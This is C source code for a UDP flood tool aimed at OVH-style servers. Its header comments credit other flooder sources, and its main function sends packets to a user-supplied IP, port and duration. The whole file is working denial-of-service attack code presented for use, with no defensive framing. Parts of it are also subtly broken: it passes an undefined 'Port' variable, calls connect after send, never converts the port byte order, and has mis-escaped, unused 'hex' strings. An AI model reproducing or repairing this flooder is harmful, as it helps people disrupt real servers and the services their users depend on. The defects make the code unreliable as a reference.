/*[+]========================================[+]
	SOME CREDIT GOES TO ANTIBOTS
  [+]========================================[+]
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <time.h>
#include <pthread.h>
 
#define FATTI_PACKETS 1460
//OVH Rail (From FATTI)
void SendOVH(unsigned char *IP, int DPORT, int Secs)
{
    int SERVER_METHOD;
    SERVER_METHOD = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    unsigned char *HexString = malloc(1024);
    memset(HexString, 0, 1024);
    hp = gethostbyname(IP);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = DPORT;
    unsigned int a = 0;
    while(1)
    {
        char * RANDOMHEXGEN[] = {    
        "\x6c\x58\x66\x59\x43\x37\x54\x46\x61\x43\x71\x35\x48\x98",
		};
		
        if (a >= 50)
        {
            
            int length;
            char RANDOMHEXGEN[] = "/x89/x25/x76/x98/x67/x87/x90/x34/";
            /* Seed number for rand() */
            srand((unsigned int) time(0) + getpid());
            length = rand() % 120 + 200;
            send(SERVER_METHOD, HexString, FATTI_PACKETS, 0);
            connect(SERVER_METHOD,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + Secs)
            {
                close(SERVER_METHOD);
                exit(0);
            }
            a = 0;
        }
        a++;
    }
}
main(int argc, char **argv)
{
    if(argc < 2)
    {
        printf("\x1b[31m[Invalid Syntax] Usage = %s <METHOD(SERVER)>\x1b[0m\n", argv[0]);
        exit(1);
    }
    if(!strcmp(argv[1], "SERVER"))
    {
        if(argc < 4)
        {
            printf("\n\x1b[31m[Invalid Syntax] Usage = %s SERVER <IP> <DPORT> <TIME>\x1b[0m\n", argv[0]);
            exit(0);
        }
        else
        {
            unsigned char *IP = argv[2];
            int DPORT = atoi(argv[3]);
            int Time = atoi(argv[4]);
            printf("\n\x1b[1;36m[+] Hex Railing -> %s For %s Seconds | CNTRL+Z To Stop [+]\x1b[0m\n", argv[2], argv[4]);
            SendOVH(IP, Port, Time);
            exit(0);
        }
    }
}